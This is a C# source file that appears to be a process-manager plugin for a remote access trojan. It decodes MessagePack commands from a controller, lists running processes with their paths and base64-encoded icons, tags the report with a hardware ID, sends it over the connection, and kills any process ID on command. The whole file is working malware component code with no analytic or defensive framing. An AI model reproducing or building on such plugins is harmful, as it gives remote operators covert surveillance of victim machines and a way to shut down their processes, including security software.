using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "processManager":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "List":
                                {
                                    new HandleProcessManager().ProcessList();
                                    break;
                                }

                            case "Kill":
                                {
                                    new HandleProcessManager().ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                    break;
                                }
                        }
                    }
                    break;
            }
        }
    }

    public class HandleProcessManager
    {
        public void ProcessKill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID)
                    {
                        process.Kill();
                    }
                }
                catch { };
            }
            ProcessList();
        }

        public void ProcessList()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                var query = "SELECT ProcessId, Name, ExecutablePath FROM Win32_Process";
                using (var searcher = new ManagementObjectSearcher(query))
                using (var results = searcher.Get())
                {
                    var processes = results.Cast<ManagementObject>().Select(x => new
                    {
                        ProcessId = (UInt32)x["ProcessId"],
                        Name = (string)x["Name"],
                        ExecutablePath = (string)x["ExecutablePath"]
                    });
                    foreach (var p in processes)
                    {
                        if (File.Exists(p.ExecutablePath))
                        {
                            string name = p.ExecutablePath;
                            string key = p.ProcessId.ToString();
                            Icon icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
                            Bitmap bmpIcon = icon.ToBitmap();
                            using (MemoryStream ms = new MemoryStream())
                            {
                                bmpIcon.Save(ms, ImageFormat.Png);
                                sb.Append(name + "-=>" + key + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                            }
                        }
                    }
                }
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "processManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

    }

}
